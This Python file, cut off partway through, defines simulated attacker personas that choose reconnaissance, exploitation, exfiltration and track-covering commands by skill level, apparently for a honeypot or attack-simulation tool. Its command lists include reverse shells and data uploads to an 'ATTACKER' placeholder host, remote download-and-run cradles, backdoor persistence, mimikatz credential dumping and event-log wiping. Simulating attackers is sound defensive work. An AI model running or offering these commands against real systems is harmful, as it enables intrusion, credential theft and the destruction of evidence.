import random
import json
import os
import time
import threading
import uuid
import re
import logging
from datetime import datetime, timedelta
import numpy as np
from typing import Dict, List, Tuple, Optional, Any, Union

# Initialize logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("logs/ai_personas.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("AI_Personas")

class PersonaProfile:
    """Base class for attacker personas"""
    
    def __init__(self, persona_id: str = None, name: str = None, skill_level: str = None):
        """Initialize a new persona profile"""
        self.id = persona_id or str(uuid.uuid4())
        self.name = name or self._generate_name()
        self.skill_level = skill_level or random.choice(["novice", "intermediate", "expert"])
        self.creation_time = datetime.now().isoformat()
        self.last_active = self.creation_time
        self.engagement_history = []
        self.knowledge_base = {}
        self.behavior_traits = self._generate_behavior_traits()
        self.objectives = self._generate_objectives()
        self.tools = self._generate_tools()
        self.indicators = self._generate_indicators()
        self.response_patterns = self._generate_response_patterns()
        self.session_attributes = {}
        
    def _generate_name(self) -> str:
        """Generate a random name for the persona"""
        first_names = ["Alex", "Sam", "Jordan", "Casey", "Taylor", "Morgan", "Riley", "Avery", "Quinn", "Blake"]
        last_names = ["Smith", "Jones", "Lee", "Wang", "Garcia", "Patel", "Kim", "Nguyen", "Williams", "Brown"]
        return f"{random.choice(first_names)}{random.choice(last_names)}{random.randint(0, 999)}"
        
    def _generate_behavior_traits(self) -> Dict[str, float]:
        """Generate behavior traits for the persona"""
        traits = {
            "patience": random.uniform(0.1, 1.0),
            "thoroughness": random.uniform(0.1, 1.0),
            "caution": random.uniform(0.1, 1.0),
            "persistence": random.uniform(0.1, 1.0),
            "creativity": random.uniform(0.1, 1.0),
            "adaptability": random.uniform(0.1, 1.0),
            "aggression": random.uniform(0.1, 1.0),
            "stealth_focus": random.uniform(0.1, 1.0)
        }
        
        # Adjust traits based on skill level
        if self.skill_level == "novice":
            traits["patience"] *= 0.7
            traits["thoroughness"] *= 0.6
            traits["caution"] *= 0.5
            traits["stealth_focus"] *= 0.4
        elif self.skill_level == "expert":
            traits["patience"] *= 1.3
            traits["thoroughness"] *= 1.4
            traits["caution"] *= 1.5
            traits["stealth_focus"] *= 1.6
            
        return traits
        
    def _generate_objectives(self) -> List[str]:
        """Generate objectives for the persona"""
        all_objectives = [
            "data_exfiltration",
            "credential_harvesting",
            "persistence_establishment",
            "lateral_movement",
            "ransomware_deployment",
            "resource_utilization",
            "vulnerability_scanning",
            "system_reconnaissance"
        ]
        
        # Select a random number of objectives based on skill level
        num_objectives = {
            "novice": lambda: random.randint(1, 2),
            "intermediate": lambda: random.randint(2, 4),
            "expert": lambda: random.randint(3, 6)
        }[self.skill_level]()
        
        return random.sample(all_objectives, num_objectives)
        
    def _generate_tools(self) -> List[str]:
        """Generate a list of tools the persona is familiar with"""
        common_tools = ["nmap", "wget", "curl", "nc", "ssh", "scp"]
        intermediate_tools = ["metasploit", "hydra", "john", "sqlmap", "dirb"]
        expert_tools = ["empire", "cobalt strike", "bloodhound", "mimikatz", "responder"]
        
        tools = []
        tools.extend(random.sample(common_tools, random.randint(1, len(common_tools))))
        
        if self.skill_level in ["intermediate", "expert"]:
            tools.extend(random.sample(intermediate_tools, random.randint(1, len(intermediate_tools))))
            
        if self.skill_level == "expert":
            tools.extend(random.sample(expert_tools, random.randint(1, len(expert_tools))))
            
        return tools
        
    def _generate_indicators(self) -> Dict[str, List[str]]:
        """Generate behavioral indicators for the persona"""
        return {
            "typing_patterns": self._generate_typing_patterns(),
            "command_patterns": self._generate_command_patterns(),
            "timing_patterns": self._generate_timing_patterns()
        }
        
    def _generate_typing_patterns(self) -> List[str]:
        """Generate typing patterns/errors"""
        patterns = []
        
        if random.random() < 0.7:
            patterns.append("occasional_typo")
            
        if self.skill_level == "novice" and random.random() < 0.8:
            patterns.append("frequent_corrections")
            
        if random.random() < 0.3:
            patterns.append("fast_typing")
            
        if self.skill_level != "expert" and random.random() < 0.4:
            patterns.append("command_repetition")
            
        return patterns
        
    def _generate_command_patterns(self) -> List[str]:
        """Generate command usage patterns"""
        patterns = []
        
        if self.skill_level == "novice":
            patterns.extend(["basic_commands_only", "help_usage", "verbose_flags"])
        elif self.skill_level == "intermediate":
            patterns.extend(["pipe_usage", "script_execution", "parameter_tweaking"])
        else:  # expert
            patterns.extend(["oneliners", "advanced_options", "custom_tools"])
            
        if random.random() < 0.5:
            patterns.append("distinctive_aliases")
            
        return patterns
        
    def _generate_timing_patterns(self) -> List[str]:
        """Generate timing patterns for commands and interactions"""
        patterns = []
        
        if self.skill_level == "novice":
            patterns.append("long_pauses")
        elif self.skill_level == "expert":
            patterns.append("rapid_execution")
            
        if random.random() < 0.6:
            patterns.append("variable_timing")
            
        if self.behavior_traits["caution"] > 0.7:
            patterns.append("deliberate_delays")
            
        return patterns
        
    def _generate_response_patterns(self) -> Dict[str, List[str]]:
        """Generate response patterns for different scenarios"""
        return {
            "access_granted": [
                "Now we're in.",
                "Access successful.",
                "Perfect.",
                "Got in.",
                "Sweet."
            ],
            "access_denied": [
                "Damn it.",
                "Access denied, trying another approach.",
                "No luck, let's try something else.",
                "Permission issues, need to find another way.",
                "That didn't work."
            ],
            "discovery": [
                "Interesting.",
                "Found something.",
                "Look at this.",
                "This could be useful.",
                "Good find."
            ],
            "error_encountered": [
                "What the hell?",
                "That's not right.",
                "Error encountered.",
                "Something's wrong.",
                "That's unexpected."
            ]
        }
        
    def update_history(self, session_id: str, interaction_type: str, details: Dict[str, Any]) -> None:
        """Update the engagement history of the persona"""
        self.engagement_history.append({
            "timestamp": datetime.now().isoformat(),
            "session_id": session_id,
            "interaction_type": interaction_type,
            "details": details
        })
        self.last_active = datetime.now().isoformat()
        
    def learn_from_interaction(self, command: str, output: str, success: bool) -> None:
        """Update knowledge base based on interaction"""
        # Extract potential usernames, hostnames, or IP addresses from output
        usernames = re.findall(r'\b[a-zA-Z0-9_-]{3,20}\b', output)
        hostnames = re.findall(r'\b[a-zA-Z0-9_-]+\.[a-zA-Z0-9_.-]+\b', output)
        ips = re.findall(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', output)
        
        # Update knowledge base
        if "discovered_usernames" not in self.knowledge_base:
            self.knowledge_base["discovered_usernames"] = []
        if "discovered_hostnames" not in self.knowledge_base:
            self.knowledge_base["discovered_hostnames"] = []
        if "discovered_ips" not in self.knowledge_base:
            self.knowledge_base["discovered_ips"] = []
        if "effective_commands" not in self.knowledge_base:
            self.knowledge_base["effective_commands"] = []
        if "ineffective_commands" not in self.knowledge_base:
            self.knowledge_base["ineffective_commands"] = []
            
        # Add new discoveries
        self.knowledge_base["discovered_usernames"].extend([u for u in usernames if u not in self.knowledge_base["discovered_usernames"]])
        self.knowledge_base["discovered_hostnames"].extend([h for h in hostnames if h not in self.knowledge_base["discovered_hostnames"]])
        self.knowledge_base["discovered_ips"].extend([ip for ip in ips if ip not in self.knowledge_base["discovered_ips"]])
        
        # Track command effectiveness
        if success and command not in self.knowledge_base["effective_commands"]:
            self.knowledge_base["effective_commands"].append(command)
        elif not success and command not in self.knowledge_base["ineffective_commands"]:
            self.knowledge_base["ineffective_commands"].append(command)
            
    def generate_next_action(self, current_context: Dict[str, Any]) -> Dict[str, Any]:
        """Generate the next action based on persona profile and context"""
        # This method should be overridden by specific persona types
        pass
        
    def to_dict(self) -> Dict[str, Any]:
        """Convert persona to dictionary for serialization"""
        return {
            "id": self.id,
            "name": self.name,
            "skill_level": self.skill_level,
            "creation_time": self.creation_time,
            "last_active": self.last_active,
            "behavior_traits": self.behavior_traits,
            "objectives": self.objectives,
            "tools": self.tools,
            "indicators": self.indicators,
            "knowledge_base": self.knowledge_base,
            "engagement_history": self.engagement_history
        }
        
    def from_dict(self, data: Dict[str, Any]) -> None:
        """Load persona from dictionary"""
        self.id = data.get("id", self.id)
        self.name = data.get("name", self.name)
        self.skill_level = data.get("skill_level", self.skill_level)
        self.creation_time = data.get("creation_time", self.creation_time)
        self.last_active = data.get("last_active", self.last_active)
        self.behavior_traits = data.get("behavior_traits", self.behavior_traits)
        self.objectives = data.get("objectives", self.objectives)
        self.tools = data.get("tools", self.tools)
        self.indicators = data.get("indicators", self.indicators)
        self.knowledge_base = data.get("knowledge_base", self.knowledge_base)
        self.engagement_history = data.get("engagement_history", self.engagement_history)


class ReconnaissancePersona(PersonaProfile):
    """Persona focused on reconnaissance and information gathering"""
    
    def __init__(self, persona_id: str = None, name: str = None, skill_level: str = None):
        super().__init__(persona_id, name, skill_level)
        
        # Override objectives to focus on reconnaissance
        self.objectives = ["system_reconnaissance", "vulnerability_scanning"]
        if self.skill_level != "novice":
            self.objectives.append("credential_harvesting")
            
        # Adjust behavior traits
        self.behavior_traits["patience"] *= 1.2
        self.behavior_traits["thoroughness"] *= 1.3
        self.behavior_traits["caution"] *= 1.4
        self.behavior_traits["aggression"] *= 0.7
        
    def generate_next_action(self, current_context: Dict[str, Any]) -> Dict[str, Any]:
        """Generate reconnaissance-focused actions"""
        system_type = current_context.get("system_type", "unknown")
        current_access = current_context.get("access_level", "none")
        discovered_info = current_context.get("discovered_info", {})
        
        # Define possible reconnaissance commands by system type
        recon_commands = {
            "linux": [
                "uname -a",
                "cat /etc/passwd",
                "cat /etc/*release",
                "ps aux",
                "netstat -tuln",
                "ls -la /home",
                "find / -perm -4000 -type f 2>/dev/null",
                "cat /etc/shadow",
                "grep -r password /var/www 2>/dev/null",
                "last"
            ],
            "windows": [
                "systeminfo",
                "net user",
                "net localgroup administrators",
                "tasklist",
                "netstat -ano",
                "dir C:\\Users",
                "findstr /si password *.txt *.ini *.config",
                "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                "wmic qfe list"
            ],
            "unknown": [
                "whoami",
                "hostname",
                "pwd",
                "ls -la",
                "ps",
                "netstat",
                "cat /etc/passwd",
                "systeminfo"
            ]
        }
        
        # Choose appropriate command based on skill level and previous discoveries
        if self.skill_level == "novice":
            # Novice attacker uses basic commands
            commands = recon_commands[system_type][:4]  # Just the first few basic commands
        elif self.skill_level == "intermediate":
            # Intermediate attacker uses more varied commands
            commands = recon_commands[system_type]
        else:  # expert
            # Expert attacker uses advanced commands and adapts based on findings
            commands = recon_commands[system_type]
            
            # Add some advanced commands based on context
            if system_type == "linux":
                commands.extend([
                    "for i in $(cat /etc/passwd | cut -d: -f1); do id $i; done",
                    "find / -type f -name \"*.conf\" | xargs grep -l \"password\" 2>/dev/null",
                    "cat /var/log/auth.log | grep \"Failed password\""
                ])
            elif system_type == "windows":
                commands.extend([
                    "powershell -ep bypass -c \"Get-WmiObject -Class Win32_UserAccount\"",
                    "wmic service get name,displayname,pathname,startmode",
                    "reg query HKCU /f password /t REG_SZ /s"
                ])
                
        # Filter out commands already in history
        used_commands = [h["details"]["command"] for h in self.engagement_history 
                        if "details" in h and "command" in h["details"]]
        available_commands = [cmd for cmd in commands if cmd not in used_commands]
        
        # If all commands used, start repeating with variations or use knowledge-based commands
        if not available_commands:
            if random.random() < 0.7 and self.knowledge_base.get("effective_commands"):
                # Use a previously effective command
                command = random.choice(self.knowledge_base["effective_commands"])
            else:
                # Repeat a command with variation
                base_command = random.choice(commands)
                if "find" in base_command:
                    command = base_command.replace("2>/dev/null", "")
                elif "ls" in base_command:
                    command = base_command.replace("-la", "-l")
                else:
                    command = base_command
        else:
            command = random.choice(available_commands)
            
        # Add timing behavior
        delay = 0
        if "long_pauses" in self.indicators["timing_patterns"]:
            delay = random.uniform(2, 10)
        elif "rapid_execution" in self.indicators["timing_patterns"]:
            delay = random.uniform(0.1, 1.5)
        elif "deliberate_delays" in self.indicators["timing_patterns"]:
            delay = random.uniform(1, 5)
        else:
            delay = random.uniform(0.5, 3)
            
        return {
            "action_type": "command",
            "command": command,
            "delay": delay,
            "persona_name": self.name,
            "skill_level": self.skill_level
        }


class ExploitationPersona(PersonaProfile):
    """Persona focused on exploitation and gaining elevated access"""
    
    def __init__(self, persona_id: str = None, name: str = None, skill_level: str = None):
        super().__init__(persona_id, name, skill_level)
        
        # Override objectives to focus on exploitation
        self.objectives = ["privilege_escalation", "persistence_establishment"]
        if self.skill_level != "novice":
            self.objectives.extend(["lateral_movement", "data_exfiltration"])
            
        # Adjust behavior traits
        self.behavior_traits["aggression"] *= 1.3
        self.behavior_traits["creativity"] *= 1.2
        self.behavior_traits["patience"] *= 0.8
        
        # Add exploitation-specific knowledge
        self.exploit_techniques = self._generate_exploit_techniques()
        
    def _generate_exploit_techniques(self) -> List[Dict[str, Any]]:
        """Generate a list of exploitation techniques the persona knows"""
        all_techniques = [
            {
                "name": "password_brute_force",
                "commands": ["hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET"],
                "skill_required": "novice"
            },
            {
                "name": "public_exploits",
                "commands": ["searchsploit apache 2.4", "msfconsole -q -x 'use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS TARGET; run'"],
                "skill_required": "intermediate"
            },
            {
                "name": "buffer_overflow",
                "commands": ["./exploit.py TARGET 4444", "nc -lvp 4444"],
                "skill_required": "expert"
            },
            {
                "name": "sql_injection",
                "commands": ["sqlmap -u 'http://TARGET/page.php?id=1' --dbs", "' OR 1=1 --"],
                "skill_required": "intermediate"
            },
            {
                "name": "privilege_escalation",
                "commands": ["sudo -l", "find / -perm -u=s -type f 2>/dev/null", "LinPEAS.sh"],
                "skill_required": "intermediate"
            },
            {
                "name": "credential_theft",
                "commands": ["cat .bash_history", "grep -r password /home", "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit"],
                "skill_required": "intermediate"
            },
            {
                "name": "web_shell_upload",
                "commands": ["curl -F 'file=@shell.php' http://TARGET/upload.php", "wget http://ATTACKER/shell.php -O /var/www/html/shell.php"],
                "skill_required": "intermediate"
            },
            {
                "name": "reverse_shell",
                "commands": ["bash -i >& /dev/tcp/ATTACKER/4444 0>&1", "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('ATTACKER',4444)"],
                "skill_required": "intermediate"
            }
        ]
        
        # Filter techniques by skill level
        skill_levels = {
            "novice": ["novice"],
            "intermediate": ["novice", "intermediate"],
            "expert": ["novice", "intermediate", "expert"]
        }
        
        valid_techniques = [t for t in all_techniques 
                           if t["skill_required"] in skill_levels[self.skill_level]]
        
        # Select a random subset based on skill level
        num_techniques = {
            "novice": lambda: random.randint(1, 2),
            "intermediate": lambda: random.randint(2, 4),
            "expert": lambda: random.randint(4, 8)
        }[self.skill_level]()
        
        return random.sample(valid_techniques, min(num_techniques, len(valid_techniques)))
        
    def generate_next_action(self, current_context: Dict[str, Any]) -> Dict[str, Any]:
        """Generate exploitation-focused actions"""
        system_type = current_context.get("system_type", "unknown")
        access_level = current_context.get("access_level", "user")
        discovered_vulns = current_context.get("discovered_vulnerabilities", [])
        
        # Define exploitation commands by context
        if access_level == "none":
            # Need to gain initial access
            if self.skill_level == "novice":
                commands = [
                    "ssh user@TARGET",
                    "ssh admin@TARGET",
                    "ftp TARGET",
                    "telnet TARGET"
                ]
            elif self.skill_level == "intermediate":
                commands = [
                    f"hydra -l admin -P /tmp/passwords.txt ssh://{current_context.get('target_ip', 'TARGET')}",
                    "sqlmap -u 'http://TARGET/login.php' --forms --dbs",
                    "nmap -sV --script=vuln TARGET"
                ]
            else:  # expert
                commands = [
                    "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST ATTACKER; set LPORT 4444; run -j'",
                    "searchsploit apache 2.4.29",
                    "python3 exploit.py TARGET 80"
                ]
        elif access_level == "user":
            # Need to escalate privileges
            if system_type == "linux":
                if self.skill_level == "novice":
                    commands = [
                        "sudo -l",
                        "find / -perm -u=s -type f 2>/dev/null",
                        "cat /etc/shadow",
                        "su root"
                    ]
                elif self.skill_level == "intermediate":
                    commands = [
                        "uname -a | grep -i 'linux'",
                        "cat /etc/issue",
                        "find / -perm -4000 -user root -type f 2>/dev/null",
                        "env | grep -i ld_preload",
                        "sudo -l | grep -i '(ALL'"
                    ]
                else:  # expert
                    commands = [
                        "wget http://ATTACKER/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh",
                        "cat /etc/sudoers",
                        "lsb_release -a && uname -a",
                        "for i in $(find / -perm -g=s -type f 2>/dev/null); do ls -l $i; done",
                        "for i in $(find / -writable -type d 2>/dev/null); do ls -ld $i; done"
                    ]
            else:  # windows
                if self.skill_level == "novice":
                    commands = [
                        "whoami /priv",
                        "net user",
                        "net localgroup administrators",
                        "dir C:\\Users\\Administrator"
                    ]
                elif self.skill_level == "intermediate":
                    commands = [
                        "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"",
                        "wmic qfe get Caption,Description,HotFixID,InstalledOn",
                        "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\"",
                        "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\""
                    ]
                else:  # expert
                    commands = [
                        "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerUp.ps1'); Invoke-AllChecks\"",
                        "powershell -ep bypass -c \"Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike 'C:\\Windows*' -and $_.PathName -notlike '\\SystemRoot*'} | Select-Object PathName\"",
                        "icacls \"C:\\Program Files\\*\" 2>nul | findstr /i \"(F) (M) (W)\" | findstr /i \":\\\\\" | findstr /i /v \"NT AUTHORITY\\\\SYSTEM BUILTIN\\\\Administrators\"",
                        "reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
                    ]
        else:  # admin/root access - focus on persistence or lateral movement
            if system_type == "linux":
                if self.skill_level == "novice":
                    commands = [
                        "echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
                        "useradd -m -s /bin/bash newuser",
                        "cat /etc/shadow > /tmp/shadow.txt",
                        "mkdir /root/.ssh"
                    ]
                elif self.skill_level == "intermediate":
                    commands = [
                        "echo '* * * * * root nc ATTACKER 4444 -e /bin/bash' >> /etc/crontab",
                        "echo 'ssh-rsa AAAAB3NzaC1yc2E...' >> /root/.ssh/authorized_keys",
                        "grep -r password /home/*",
                        "find / -name id_rsa 2>/dev/null"
                    ]
                else:  # expert
                    commands = [
                        "echo '#!/bin/bash\\nbash -i >& /dev/tcp/ATTACKER/4444 0>&1' > /etc/init.d/startup && chmod 755 /etc/init.d/startup && update-rc.d startup defaults",
                        "apt-get install openssh-server && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && service ssh restart",
                        "for ip in $(ip addr | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}'); do nmap -p 22,3389 --open $ip/24; done",
                        "cat /etc/passwd | cut -d: -f1 | while read user; do ls -la /home/$user/.ssh 2>/dev/null; done"
                    ]
            else:  # windows
                if self.skill_level == "novice":
                    commands = [
                        "net user newadmin Password123! /add",
                        "net localgroup administrators newadmin /add",
                        "netsh firewall set opmode disable",
                        "reg query HKLM /f password /t REG_SZ /s"
                    ]
                elif self.skill_level == "intermediate":
                    commands = [
                        "schtasks /create /sc minute /mo 1 /tn \"Windows Update\" /tr \"powershell -c 'iex (New-Object Net.WebClient).DownloadString(\\'http://ATTACKER/backdoor.ps1\\')' \" /ru SYSTEM",
                        "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Update /t REG_SZ /d \"cmd.exe /c powershell -ep bypass -c \\\"IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/backdoor.ps1')\\\"\" /f",
                        "wmic /node:\"TARGET\" process call create \"cmd.exe /c reg add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" /v \\\"Userinit\\\" /t REG_SZ /d \\\"C:\\Windows\\system32\\userinit.exe,C:\\Windows\\temp\\backdoor.exe\\\" /f\"",
                        "net group \"Domain Admins\" /domain"
                    ]
                else:  # expert
                    commands = [
                        "powershell -ep bypass -c \"Install-WindowsFeature -Name RSAT-AD-PowerShell; Import-Module ActiveDirectory; Get-ADComputer -Filter * -Properties * | Select-Object -Property Name,DNSHostName,OperatingSystem,IPv4Address\"",
                        "powershell -ep bypass -c \"New-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe' -Name 'Debugger' -Value 'cmd.exe' -PropertyType 'String'\"",
                        "bitsadmin /transfer backdoor /download /priority high http://ATTACKER/beacon.exe C:\\Windows\\Temp\\svchost.exe && sc create \"Windows Service\" binPath= \"C:\\Windows\\Temp\\svchost.exe\" start= auto && sc start \"Windows Service\"",
                        "powershell -ep bypass -c \"Get-ADUser -Filter * -Properties * | Where-Object {$_.Enabled -eq $true} | Select-Object SamAccountName,UserPrincipalName,AdminCount,PasswordLastSet,LastLogonDate,LogonCount,BadLogonCount | Export-Csv -Path C:\\temp\\domain_users.csv -NoTypeInformation\""
                    ]
                    
        # Filter out commands already in history
        used_commands = [h["details"]["command"] for h in self.engagement_history 
                        if "details" in h and "command" in h["details"]]
        available_commands = [cmd for cmd in commands if cmd not in used_commands]
        
        # If all commands used, use exploit techniques or knowledge-based commands
        if not available_commands:
            if self.exploit_techniques and random.random() < 0.7:
                # Use one of our exploitation techniques
                technique = random.choice(self.exploit_techniques)
                command = random.choice(technique["commands"])
                
                # Replace TARGET/ATTACKER placeholders
                command = command.replace("TARGET", current_context.get("target_ip", "127.0.0.1"))
                command = command.replace("ATTACKER", current_context.get("attacker_ip", "192.168.1.100"))
            elif self.knowledge_base.get("effective_commands"):
                # Use a previously effective command
                command = random.choice(self.knowledge_base["effective_commands"])
            else:
                # Just pick a random command
                command = random.choice(commands)
        else:
            command = random.choice(available_commands)
            
        # Add timing behavior
        delay = 0
        if "long_pauses" in self.indicators["timing_patterns"]:
            delay = random.uniform(2, 10)
        elif "rapid_execution" in self.indicators["timing_patterns"]:
            delay = random.uniform(0.1, 1.5)
        elif "deliberate_delays" in self.indicators["timing_patterns"]:
            delay = random.uniform(1, 5)
        else:
            delay = random.uniform(0.5, 3)
            
        return {
            "action_type": "command",
            "command": command,
            "delay": delay,
            "persona_name": self.name,
            "skill_level": self.skill_level
        }


class ExfiltrationPersona(PersonaProfile):
    """Persona focused on data exfiltration and covering tracks"""
    
    def __init__(self, persona_id: str = None, name: str = None, skill_level: str = None):
        super().__init__(persona_id, name, skill_level)
        
        # Override objectives to focus on exfiltration
        self.objectives = ["data_exfiltration", "lateral_movement", "persistence_establishment"]
        
        # Adjust behavior traits
        self.behavior_traits["stealth_focus"] *= 1.5
        self.behavior_traits["thoroughness"] *= 1.2
        self.behavior_traits["patience"] *= 1.3
        
    def generate_next_action(self, current_context: Dict[str, Any]) -> Dict[str, Any]:
        """Generate exfiltration-focused actions"""
        system_type = current_context.get("system_type", "unknown")
        access_level = current_context.get("access_level", "user")
        
        # Define exfiltration commands by context
        if system_type == "linux":
            if self.skill_level == "novice":
                commands = [
                    "grep -r password /home/",
                    "find /home -name \"*.txt\"",
                    "find / -name \"*.conf\" | xargs grep -l password",
                    "tar -czvf /tmp/data.tar.gz /home/user/Documents"
                ]
            elif self.skill_level == "intermediate":
                commands = [
                    "find / -type f -name \"*.pdf\" -o -name \"*.doc\" -o -name \"*.xls\" 2>/dev/null",
                    "grep -r -i \"api_key\\|apikey\\|client_secret\\|password\\|credential\" /home/ 2>/dev/null",
                    "find /var/www -type f -name \"*.php\" -exec grep -l \"password\" {} \\;",
                    "tar -czvf /tmp/data.tar.gz /etc/passwd /etc/shadow /home/*/.ssh /var/mail",
                    "nc ATTACKER 4444 < /tmp/data.tar.gz"
                ]
            else:  # expert
                commands = [
                    "find / -type f -mtime -7 -size +1M -size -10M 2>/dev/null",
                    "find /home -type f -name \"*.kdbx\" -o -name \"*.key\" -o -name \"id_rsa\" 2>/dev/null",
                    "for i in $(find /var/www -name \"config*.php\"); do grep -i \"password\\|database\" $i; done",
                    "tar -czvf - /etc/passwd /etc/shadow /home/*/.ssh /var/mail /var/www/*/wp-config.php 2>/dev/null | openssl enc -aes-256-cbc -e -k \"password\" | base64 | curl -X POST -d @- http://ATTACKER/exfil",
                    "grep -r -i -E \"BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY\" /home/"
                ]
        else:  # windows
            if self.skill_level == "novice":
                commands = [
                    "dir C:\\Users\\*\\Documents\\*.pdf /s",
                    "findstr /si password *.txt *.ini *.config",
                    "xcopy C:\\Users\\user\\Documents\\*.* \\\\ATTACKER\\share\\",
                    "type C:\\Users\\user\\Desktop\\passwords.txt"
                ]
            elif self.skill_level == "intermediate":
                commands = [
                    "powershell -c \"Get-ChildItem -Path C:\\Users -Include *.doc,*.pdf,*.xls,*.xlsx -File -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.CreationTime -gt (Get-Date).AddDays(-30)}\"",
                    "powershell -c \"Get-ChildItem -Path C:\\ -Include *.config,*.xml -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password' | Export-Csv -Path C:\\temp\\passwords.csv -NoTypeInformation\"",
                    "certutil -urlcache -split -f \"http://ATTACKER/nc.exe\" C:\\Windows\\Temp\\nc.exe && C:\\Windows\\Temp\\nc.exe -w 3 ATTACKER 4444 < C:\\temp\\passwords.csv",
                    "reg query HKCU /f password /t REG_SZ /s > C:\\temp\\reg_passwords.txt"
                ]
            else:  # expert
                commands = [
                    "powershell -ep bypass -c \"Get-ChildItem -Path C:\\Users -Include *.pst,*.ost,*.msg -File -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination C:\\temp\\mail_backup\"",
                    "powershell -ep bypass -c \"Get-WmiObject -Class Win32_UserAccount | Export-Csv -Path C:\\temp\\users.csv -NoTypeInformation; Get-ChildItem -Path 'C:\\Program Files' -Include web.config,*.config -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'connectionString|password' | Out-File C:\\temp\\configs.txt\"",
                    "powershell -ep bypass -c \"Get-ChildItem Env: | Out-File C:\\temp\\env.txt; Get-Process | Out-File C:\\temp\\processes.txt; Get-Service | Out-File C:\\temp\\services.txt; Compress-Archive -Path C:\\temp\\*.txt,C:\\temp\\*.csv -DestinationPath C:\\temp\\data.zip -Force\"",
                    "powershell -ep bypass -c \"$client = New-Object System.Net.WebClient; $client.UploadFile('http://ATTACKER/upload.php', 'C:\\temp\\data.zip')\"",
                    "powershell -ep bypass -c \"$bytes = [System.IO.File]::ReadAllBytes('C:\\temp\\data.zip'); $encoded = [System.Convert]::ToBase64String($bytes); $webClient = New-Object System.Net.WebClient; $webClient.Headers.Add('Content-Type', 'application/octet-stream'); $webClient.UploadString('http://ATTACKER/data', $encoded)\""
                ]
                
        # Now add commands for covering tracks
        if access_level == "admin" or access_level == "root":
            if system_type == "linux":
                if self.skill_level == "novice":
                    cleanup_commands = [
                        "rm /tmp/data.tar.gz",
                        "history -c",
                        "rm ~/.bash_history"
                    ]
                elif self.skill_level == "intermediate":
                    cleanup_commands = [
                        "rm -rf /tmp/*",
                        "cat /dev/null > ~/.bash_history",
                        "history -c",
                        "unset HISTFILE"
                    ]
                else:  # expert
                    cleanup_commands = [
                        "find /var/log -type f -exec truncate -s 0 {} \\;",
                        "export HISTSIZE=0",
                        "ln -sf /dev/null ~/.bash_history",
                        "for i in $(find /home -name \".bash_history\"); do cat /dev/null > $i; done",
                        "for i in $(find /home -name \".zsh_history\"); do cat /dev/null > $i; done"
                    ]
            else:  # windows
                if self.skill_level == "novice":
                    cleanup_commands = [
                        "del C:\\temp\\*.* /q",
                        "del C:\\Windows\\Temp\\*.* /q"
                    ]
                elif self.skill_level == "intermediate":
                    cleanup_commands = [
                        "del C:\\temp\\*.* /q",
                        "del C:\\Windows\\Temp\\*.* /q",
                        "wevtutil cl System",
                        "wevtutil cl Security"
                    ]
                else:  # expert
                    cleanup_commands = [
                        "powershell -ep bypass -c \"Clear-EventLog -LogName Security, System, Application\"",
                        "powershell -ep bypass -c \"Remove-Item -Path C:\\temp\\* -Recurse -Force; Remove-Item -Path C:\\Windows\\Temp\\* -Recurse -Force\"",
                        "wevtutil cl System",
                        "wevtutil cl Security",
                        "wevtutil cl Application",
                        "for /f \"tokens=*\" %i in ('wevtutil el') do wevtutil cl \"%i\""
                    ]
                    
            # Add cleanup commands to our main commands list
            commands.extend(cleanup_commands)
            
        # Filter out commands already in history
        used_commands = [h["details"]["command"] for h in self.engagement_history 
                        if "details" in h and "command" in h["details"]]
        available_commands = [cmd for cmd in commands if cmd not in used_commands]
        
        # If all commands used, use knowledge-based commands or slight variations
        if not available_commands:
            if self.knowledge_base.get("effective_commands"):
                # Use a previously effective command
                command = random.choice(self.knowledge_base["effective_commands"])
            else:
                # Create slight variation of a previous command
                base_command = random.choice(commands)
                if "find" in base_command:
                    command = base_command.replace("2>/dev/null", "")
                elif "grep" in base_command:
                    command = base_command.replace("-r", "-r -i")
                else:
                    command = base_command
        else:
            command = random.choice(available_commands)
            
        # Add timing behavior
        delay = 0
        if "long_pauses" in self.indicators["timing_patterns"]:
            delay = random.uniform(2, 10)
        elif "rapid_execution" in self.indicators["timing_patterns"]:
            delay = random.uniform(0.1, 1.5)
        elif "deliberate_delays" in self.indicators["timing_patterns"]:
            delay = random.uniform(1, 5)
        else:
            delay = random.uniform(0.5, 3)
            
        return {
            "action_type": "command",
            "command": command,
            "delay": delay,
            "persona_name": self.name,
            "skill_level": self.skill_level
        }


class PersonaManager:
    """Manages the creation and tracking of attacker personas"""
    
    def __init__(self, storage_path="data/personas"):
        self.personas = {}
        self.storage_path = storage_path
        self.persona_types = {
